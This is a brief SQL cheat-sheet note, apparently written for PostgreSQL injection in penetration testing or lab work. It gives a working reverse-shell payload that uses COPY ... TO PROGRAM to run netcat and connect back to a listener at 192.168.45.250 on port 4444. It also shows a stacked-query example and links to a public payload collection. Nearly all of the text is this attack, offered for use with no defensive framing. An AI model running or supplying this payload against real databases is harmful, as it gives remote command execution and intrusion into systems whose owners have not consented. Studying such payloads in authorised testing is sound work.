
```sql
-- Run Reverse Shell command
COPY (SELECT '') to PROGRAM 'nc -c sh 192.168.45.250 4444';

-- Start a new query
SELECT 1; SELECT 2;

-- Great documentation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
```